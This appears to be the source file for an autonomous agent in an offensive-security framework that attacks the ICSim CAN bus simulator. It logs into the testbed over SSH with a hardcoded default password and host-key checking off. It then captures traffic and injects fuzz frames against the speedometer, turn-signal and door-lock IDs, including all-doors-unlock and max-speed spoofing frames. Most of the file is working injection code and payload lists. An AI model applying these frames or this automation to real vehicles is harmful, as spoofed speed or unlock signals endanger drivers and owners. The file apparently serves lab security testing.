"""
Automotive Agent - ICSim CAN Bus Security Testing Agent.
=========================================================

This agent targets ICSim (Instrument Cluster Simulator) via the CAN bus.
ICSim runs on a ``vcan0`` virtual CAN interface inside the automotive-testbed
container and simulates real ECU behaviour for:

- **Speedometer** (arb ID ``0x244``): byte 7 = speed value (0x00–0xFF)
- **Turn signals** (arb ID ``0x188``): byte 0 bit 0 = right, bit 1 = left
- **Door locks**   (arb ID ``0x19B``): nibbles map to individual doors

Pipeline
--------
1. **Discovery**   : Passive ``candump`` capture → enumerate active arb IDs.
2. **Baseline**    : Capture clean traffic and summarise.
3. **Payload fuzzing**: Iterates through a fuzz matrix for each target arb ID.
4. **Injection**   : ``cansend`` specific manipulation frames.
5. **Differential**: Compare post-attack capture to baseline → anomaly score.
6. **Validation**  : Parse diff results and record attack outcomes.

Automotive Validators
---------------------
The module includes ``src/utils/automotive_validators.py`` logic inline:
- ``is_valid_arb_id``     : Validates hex arbitration ID format.
- ``is_valid_can_frame``  : Checks full ``ID#DATA`` format for cansend.
- ``is_safe_interface``   : Whitelist-only interface check.
- ``is_in_speed_range``   : Validates target speed value (0–255).

ICSim CAN Reference
-------------------
+----+--------+-----------------------------------------------------------+
| ID | Hex    | Description                                               |
+====+========+===========================================================+
| 0x244 | 580 | Speedometer. Byte 7 (last) = speed 0x00–0xFF.          |
| 0x188 | 392 | Turn signals. Byte 0: 0x01=right, 0x02=left, 0x03=both.|
| 0x19B | 411 | Door locks. Nibble: 0x01=driver, 0x02=pass, 0x10=all.  |
+-------+-----+---------------------------------------------------------+
"""

from __future__ import annotations

import asyncio
import logging
import time
from typing import Any, Dict, List, Optional, Tuple

from src.agents.base import BaseAgent
from src.mcp.mcp_tool_bridge import get_mcp_bridge
from src.state.cyber_state import CyberState
from src.state.models import CANCommand, OTDiscovery
from src.utils.parsers import (
    differential_can_analysis,
    parse_candump_output,
    summarise_can_traffic,
    CANTrafficSummary,
)

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Configuration constants
# ---------------------------------------------------------------------------

# We use the Kali MCP server's generic execute_command tool to run CAN
# utilities via SSH on the automotive-testbed container.  This avoids needing
# custom can_dump/can_send MCP tools and works with the existing stack.
AUTOMOTIVE_ALLOWED_TOOLS = {"execute_command"}

# Target where vcan0 lives (reachable from kali-mcp container over Docker net).
CAN_TARGET_HOST = "automotive-testbed"

# SSH credentials — default weak creds found in infotainment/app.py.
SSH_USER = "admin"
SSH_PASS = "password123"

# Default CAN interface inside the automotive-testbed container.
CAN_INTERFACE = "vcan0"

# Seconds to wait for a single MCP tool call.
TOOL_TIMEOUT_SECONDS = 40

# Number of frames to capture for baseline / post-attack snapshots.
BASELINE_FRAME_COUNT = 50

# Duration (seconds) for baseline capture.
BASELINE_DURATION = 4

# Anomaly score threshold: above this we classify the attack as confirmed.
ANOMALY_THRESHOLD = 12

# ---------------------------------------------------------------------------
# ICSim CAN ID constants
# ---------------------------------------------------------------------------

ICSIM_SPEEDOMETER_ID    = "244"  # 0x244
ICSIM_TURN_SIGNAL_ID    = "188"  # 0x188
ICSIM_DOOR_LOCK_ID      = "19B"  # 0x19B

# Known ICSim arbitration IDs used for scope validation.
ICSIM_KNOWN_IDS = {ICSIM_SPEEDOMETER_ID, ICSIM_TURN_SIGNAL_ID, ICSIM_DOOR_LOCK_ID}

# ---------------------------------------------------------------------------
# Automotive validators (inline, no extra file dependency)
# ---------------------------------------------------------------------------

import re as _re

def is_valid_arb_id(arb_id: str) -> bool:
    """
    Validate a CAN arbitration ID string.

    Rules
    -----
    - Standard frame: 1–3 hex digits (11-bit, 0x000–0x7FF)
    - Extended frame: up to 8 hex digits (29-bit, 0x00000000–0x1FFFFFFF)
    - Must not be empty.

    Examples::

        is_valid_arb_id("244")        # True  (standard)
        is_valid_arb_id("0x244")      # False (0x prefix not accepted)
        is_valid_arb_id("DEADBEEF")   # True  (extended)
        is_valid_arb_id("DEADBEEF0")  # False (too long)
    """
    if not arb_id or not isinstance(arb_id, str):
        return False
    cleaned = arb_id.strip().upper()
    return bool(_re.match(r"^[0-9A-F]{1,8}$", cleaned))


def is_valid_can_frame(frame: str) -> bool:
    """
    Validate a CAN frame string in ``cansend`` format (``ID#DATA``).

    Rules
    -----
    - Format: ``<HEX_ID>#<HEX_DATA>``
    - ID: 1–8 hex digits
    - DATA: 0–16 hex digits (0–8 bytes)
    - No spaces, no ``0x`` prefix

    Examples::

        is_valid_can_frame("244#0000000000000032")  # True
        is_valid_can_frame("244#")                  # True  (empty data = RTR)
        is_valid_can_frame("244#GGGG")              # False (invalid hex)
        is_valid_can_frame("244")                   # False (missing # separator)
    """
    if not frame or not isinstance(frame, str):
        return False
    return bool(_re.match(r"^[0-9A-Fa-f]{1,8}#[0-9A-Fa-f]{0,16}$", frame.strip()))


def is_safe_interface(interface: str) -> bool:
    """
    Validate a CAN interface name against a safe whitelist.

    Only ``vcan0``–``vcan9`` and ``can0``–``can9`` are permitted.
    This prevents shell injection via crafted interface names.

    Examples::

        is_safe_interface("vcan0")      # True
        is_safe_interface("can1")       # True
        is_safe_interface("eth0")       # False
        is_safe_interface("vcan0; rm")  # False
    """
    if not interface or not isinstance(interface, str):
        return False
    return bool(_re.match(r"^v?can\d$", interface.strip()))


def is_in_speed_range(speed_byte: int) -> bool:
    """
    Validate that a speedometer byte value is in the legal ICSim range.

    ICSim speedometer (arb ID 0x244) uses byte 7 as unsigned speed.
    Values 0x00–0xFF are all valid; this function serves as a type guard.

    Examples::

        is_in_speed_range(0)    # True   (stopped)
        is_in_speed_range(255)  # True   (max speed)
        is_in_speed_range(256)  # False  (overflow)
        is_in_speed_range(-1)   # False  (negative)
    """
    return isinstance(speed_byte, int) and 0 <= speed_byte <= 255


# ---------------------------------------------------------------------------
# Payload fuzz corpus for each ICSim target
# ---------------------------------------------------------------------------

# Speed manipulation payloads (byte 7 = speed value, bytes 0-6 = 0)
SPEED_FUZZ_CORPUS: List[Tuple[str, str]] = [
    ("244#0000000000000000", "speed=0   (full stop)"),
    ("244#0000000000000032", "speed=50  (normal speed)"),
    ("244#0000000000000064", "speed=100 (fast)"),
    ("244#00000000000000C8", "speed=200 (overmax)"),
    ("244#00000000000000FF", "speed=255 (max)"),
    ("244#FFFFFFFFFFFFFFFF", "all bytes=0xFF (fuzz)"),
    ("244#0000000000000001", "speed=1   (near zero)"),
    ("244#000000000000007F", "speed=127 (midpoint)"),
]

# Turn signal payloads
TURN_FUZZ_CORPUS: List[Tuple[str, str]] = [
    ("188#0100000000000000", "right blinker on"),
    ("188#0200000000000000", "left blinker on"),
    ("188#0300000000000000", "both blinkers on (hazard)"),
    ("188#0000000000000000", "all signals off"),
    ("188#FF00000000000000", "byte 0 = 0xFF (fuzz all bits)"),
]

# Door lock payloads
DOOR_FUZZ_CORPUS: List[Tuple[str, str]] = [
    ("19B#0000000000000000", "all doors locked"),
    ("19B#0100000000000000", "driver door unlock"),
    ("19B#0200000000000000", "passenger door unlock"),
    ("19B#1000000000000000", "all doors unlock command"),
    ("19B#FF00000000000000", "byte 0 = 0xFF (fuzz)"),
]

# Full fuzz corpus mapping: arb_id → list of (frame, description) tuples
FUZZ_CORPUS: Dict[str, List[Tuple[str, str]]] = {
    ICSIM_SPEEDOMETER_ID: SPEED_FUZZ_CORPUS,
    ICSIM_TURN_SIGNAL_ID: TURN_FUZZ_CORPUS,
    ICSIM_DOOR_LOCK_ID: DOOR_FUZZ_CORPUS,
}


class AutomotiveAgent(BaseAgent):
    """
    ICSim CAN Bus security testing agent.

    Executes the full automotive security test lifecycle:

    1. Discover active CAN IDs on vcan0.
    2. Capture baseline traffic.
    3. Fuzz each target arb ID with the corpus payloads.
    4. Inject specific manipulation frames (speedometer attack).
    5. Capture post-attack traffic and run differential analysis.
    6. Report findings with anomaly score and payload diffs.
    """

    def __init__(self) -> None:
        super().__init__("automotive", "Automotive CAN Bus Security Specialist")

    @property
    def system_prompt(self) -> str:
        return (
            "CAN bus security analyst: discover ICSim arbitration IDs, "
            "fuzz payloads, inject manipulation frames, and validate attacks "
            "using differential traffic analysis."
        )

    # -----------------------------------------------------------------------
    # LangGraph entry point
    # -----------------------------------------------------------------------

    async def call_llm(self, state: CyberState) -> Dict[str, Any]:
        interface = CAN_INTERFACE
        logger.info("AutomotiveAgent starting on interface %s", interface)

        if not is_safe_interface(interface):
            return self.log_error(
                state,
                error_type="ValidationError",
                error=f"Unsafe CAN interface: {interface}",
            )

        bridge = await self._get_bridge()

        # ── Phase 1: Discover active CAN IDs ────────────────────────────────
        logger.info("Phase 1: Discovering active CAN arbitration IDs")
        discovered_ids = await self._discover_can_ids(bridge, interface)
        if not discovered_ids:
            logger.warning("AutomotiveAgent: no CAN IDs discovered — bus may be silent")

        logger.info("Discovered %d unique CAN ID(s): %s", len(discovered_ids), discovered_ids)

        # ── Phase 2: Baseline capture ────────────────────────────────────────
        logger.info("Phase 2: Capturing baseline CAN traffic")
        baseline_summary = await self._capture_baseline(bridge, interface)

        # ── Phase 3: Payload fuzzing ─────────────────────────────────────────
        logger.info("Phase 3: Payload fuzzing all ICSim target IDs")
        fuzz_results = await self._fuzz_all_targets(bridge, interface)

        # ── Phase 4: Speedometer manipulation ───────────────────────────────
        logger.info("Phase 4: Speedometer manipulation attack (speed=0xFF)")
        speed_attack_success = await self._speedometer_attack(bridge, interface, speed_byte=0xFF)

        # ── Phase 5: Post-attack differential ───────────────────────────────
        logger.info("Phase 5: Post-attack differential analysis")
        post_summary = await self._capture_baseline(bridge, interface)
        diff = differential_can_analysis(baseline_summary, post_summary)

        confirmed = diff["anomaly_score"] >= ANOMALY_THRESHOLD
        logger.info(
            "Differential analysis: anomaly_score=%d confirmed=%s summary=%s",
            diff["anomaly_score"],
            confirmed,
            diff["summary"],
        )

        # ── Build OT findings for state ──────────────────────────────────────
        ot_discovery = OTDiscovery(
            can_arbitration_ids=discovered_ids,
            uds_services={},
        ).model_dump()

        critical_findings = []
        if confirmed:
            critical_findings.append(
                f"ICSim manipulation CONFIRMED: anomaly_score={diff['anomaly_score']} — {diff['summary']}"
            )
        if speed_attack_success:
            critical_findings.append(
                "Speedometer manipulation: injected 244#FF (max speed) accepted by ICSim"
            )

        return {
            "current_agent": "automotive",
            "ot_discovery": {"can": ot_discovery},
            **self.log_action(
                state,
                action="can_bus_attack",
                target=interface,
                findings={
                    "discovered_ids": discovered_ids,
                    "baseline_frames": baseline_summary.total_frames,
                    "fuzz_results": fuzz_results,
                    "speedometer_attack_success": speed_attack_success,
                    "differential": diff,
                    "attack_confirmed": confirmed,
                },
                reasoning=(
                    f"Automotive agent executed CAN discovery, payload fuzzing, "
                    f"speedometer manipulation, and differential analysis on {interface}. "
                    f"Anomaly score: {diff['anomaly_score']}/100."
                ),
            ),
            "critical_findings": critical_findings,
        }

    # -----------------------------------------------------------------------
    # Phase 1: CAN ID discovery
    # -----------------------------------------------------------------------

    async def _discover_can_ids(
        self,
        bridge: Optional[Any],
        interface: str,
    ) -> List[str]:
        """
        Passively capture vcan0 traffic to enumerate active arbitration IDs.

        Runs ``candump`` on the automotive-testbed via SSH through the kali
        execute_command MCP tool.  Returns sorted unique uppercase hex IDs.
        """
        cmd = self._ssh_cmd(
            f"timeout {BASELINE_DURATION} candump {interface} -n {BASELINE_FRAME_COUNT} 2>&1 || true"
        )
        raw = await self._exec(bridge, cmd)
        if raw is None:
            return []

        frames = parse_candump_output(raw)
        summary = summarise_can_traffic(frames)
        return summary.unique_ids

    # -----------------------------------------------------------------------
    # Phase 2: Baseline capture
    # -----------------------------------------------------------------------

    async def _capture_baseline(
        self,
        bridge: Optional[Any],
        interface: str,
    ) -> CANTrafficSummary:
        """Capture up to BASELINE_FRAME_COUNT frames via SSH and summarise."""
        cmd = self._ssh_cmd(
            f"timeout {BASELINE_DURATION} candump -t a {interface} "
            f"-n {BASELINE_FRAME_COUNT} 2>&1 || true"
        )
        raw = await self._exec(bridge, cmd)
        if raw is None:
            return CANTrafficSummary()

        frames = parse_candump_output(raw)
        summary = summarise_can_traffic(frames)
        logger.info(
            "Baseline: %d frames, %d unique IDs, ~%.1f fps",
            summary.total_frames,
            len(summary.unique_ids),
            summary.frames_per_second or 0,
        )
        return summary

    # -----------------------------------------------------------------------
    # Phase 3: Payload fuzzing
    # -----------------------------------------------------------------------

    async def _fuzz_all_targets(
        self,
        bridge: Optional[Any],
        interface: str,
    ) -> Dict[str, List[Dict[str, Any]]]:
        """
        Iterate through the fuzz corpus for each ICSim target arb ID.

        For each frame in the corpus:
        1. Validate the frame format.
        2. Send via ``can_send``.
        3. Record success/failure.

        Returns
        -------
        Dict mapping arb_id → list of per-frame fuzz results.
        """
        results: Dict[str, List[Dict[str, Any]]] = {}

        for arb_id, corpus in FUZZ_CORPUS.items():
            logger.info("Fuzzing arb ID %s (%d payloads)", arb_id, len(corpus))
            id_results: List[Dict[str, Any]] = []

            for frame, description in corpus:
                if not is_valid_can_frame(frame):
                    logger.warning("Skipping invalid fuzz frame: %s", frame)
                    continue

                cmd = self._ssh_cmd(f"cansend {interface} {frame}")
                raw = await self._exec(bridge, cmd)

                # cansend exits 0 and prints nothing on success
                stdout = (raw or {}).get("stdout", "") or ""
                stderr = (raw or {}).get("stderr", "") or ""
                success = raw is not None and "error" not in stderr.lower()
                id_results.append({
                    "frame": frame,
                    "description": description,
                    "success": success,
                    "response": (stdout + stderr)[:120],
                })
                logger.debug("Fuzz %s [%s]: %s", frame, description, "OK" if success else "FAIL")

                # Brief pause between fuzz frames to avoid bus overload
                await asyncio.sleep(0.05)

            results[arb_id] = id_results
            success_count = sum(1 for r in id_results if r["success"])
            logger.info(
                "Fuzz arb ID %s: %d/%d frames accepted",
                arb_id, success_count, len(id_results),
            )

        return results

    # -----------------------------------------------------------------------
    # Phase 4: Speedometer manipulation
    # -----------------------------------------------------------------------

    async def _speedometer_attack(
        self,
        bridge: Optional[Any],
        interface: str,
        speed_byte: int = 0xFF,
    ) -> bool:
        """
        Inject a speedometer manipulation frame to ICSim.

        ICSim speedometer frame format:
        - Arb ID: 0x244
        - Bytes 0-6: 0x00 (padding)
        - Byte 7: speed value (0x00=stopped, 0xFF=maximum)

        The attack sends the frame 20 times at 50ms intervals to ensure
        ICSim's display updates (it requires sustained traffic).

        Args:
            bridge:     MCP bridge.
            interface:  CAN interface.
            speed_byte: Speed value to inject (0–255).

        Returns:
            True if at least one cansend call succeeded.
        """
        if not is_in_speed_range(speed_byte):
            logger.error("Invalid speed_byte: %d (must be 0–255)", speed_byte)
            return False

        # Build frame: 244#AABBCCDDEEFFGGHH where byte 7 (last) = speed_byte.
        # Bytes 0-6 = 0x00, byte 7 = speed value as 2 hex chars.
        speed_hex = format(speed_byte, "02X")
        frame = f"{ICSIM_SPEEDOMETER_ID}#{'00' * 7}{speed_hex}"  # 244#0000000000000032


        if not is_valid_can_frame(frame):
            logger.error("Built invalid speedometer frame: %s", frame)
            return False

        logger.info(
            "Speedometer attack: injecting %s (speed_byte=0x%02X) x20 on %s",
            frame, speed_byte, interface,
        )

        # Send 20 repeated frames via SSH to force ICSim display update.
        # cansend is called in a tight loop on the testbed.
        repeat_cmd = " && ".join([f"cansend {interface} {frame}"] * 20)
        cmd = self._ssh_cmd(repeat_cmd)
        raw = await self._exec(bridge, cmd)

        stderr = (raw or {}).get("stderr", "") or ""
        success = raw is not None and "error" not in stderr.lower()
        logger.info(
            "Speedometer attack: %s",
            "SUCCESS" if success else "FAILED",
        )
        return success

    # -----------------------------------------------------------------------
    # SSH command helpers
    # -----------------------------------------------------------------------

    def _ssh_cmd(self, remote_cmd: str) -> str:
        """
        Build an SSH command that runs ``remote_cmd`` on the automotive-testbed.

        Uses ``sshpass`` for password-based auth (available on Kali) so no
        interactive prompt is needed.  ``StrictHostKeyChecking=no`` avoids
        first-connect fingerprint prompts inside the container network.

        Args:
            remote_cmd: Shell command to execute on the testbed.

        Returns:
            Full SSH command string ready for execute_command.
        """
        escaped = remote_cmd.replace("'", "'\"'\"'")
        return (
            f"sshpass -p '{SSH_PASS}' "
            f"ssh -o StrictHostKeyChecking=no "
            f"-o ConnectTimeout=5 "
            f"{SSH_USER}@{CAN_TARGET_HOST} "
            f"'{escaped}'"
        )

    # -----------------------------------------------------------------------
    # Generic MCP execute_command caller
    # -----------------------------------------------------------------------

    async def _exec(
        self,
        bridge: Optional[Any],
        command: str,
    ) -> Optional[Dict[str, Any]]:
        """
        Run an arbitrary shell command on the Kali server via the MCP bridge's
        ``execute_command`` tool.  This is used to SSH into the automotive-
        testbed and run CAN tools (candump, cansend) where vcan0 lives.

        The bridge stores the tool as ``kali_execute_command`` so we match
        with ``endswith("execute_command")``.

        Args:
            bridge:  MCP bridge instance or None.
            command: Shell command to execute on the Kali server.

        Returns:
            Dict with ``stdout``, ``stderr``, ``success`` keys, or None.
        """
        if bridge is None:
            logger.warning("AutomotiveAgent: MCP bridge not available")
            return None

        tools = bridge.get_tools_for_agent(AUTOMOTIVE_ALLOWED_TOOLS)
        tool = next((t for t in tools if t.name.endswith("execute_command")), None)

        if tool is None:
            available = [t.name for t in bridge.all_tools]
            logger.warning(
                "AutomotiveAgent: execute_command not found in bridge. "
                "Available: %s",
                available,
            )
            return None

        try:
            raw = await asyncio.wait_for(
                tool.coroutine(command=command),
                timeout=TOOL_TIMEOUT_SECONDS,
            )
            # The bridge returns a JSON string; parse it
            import json as _json
            if isinstance(raw, str):
                try:
                    return _json.loads(raw)
                except Exception:
                    return {"stdout": raw, "stderr": "", "success": True}
            return raw or {}
        except asyncio.TimeoutError:
            logger.warning(
                "AutomotiveAgent: execute_command timed out after %ds (cmd=%s...)",
                TOOL_TIMEOUT_SECONDS, command[:60],
            )
            return None
        except Exception as exc:
            logger.warning("AutomotiveAgent: execute_command failed: %s", exc)
            return None

    async def _get_bridge(self) -> Optional[Any]:
        """Return MCP bridge or None on failure."""
        try:
            return await get_mcp_bridge()
        except Exception as exc:
            logger.warning("AutomotiveAgent: MCP bridge unavailable: %s", exc)
            return None


# ---------------------------------------------------------------------------
# LangGraph node wrapper
# ---------------------------------------------------------------------------

async def automotive_node(state: CyberState) -> Dict[str, Any]:
    """LangGraph node wrapper for AutomotiveAgent."""
    agent = AutomotiveAgent()
    return await agent.call_llm(state)
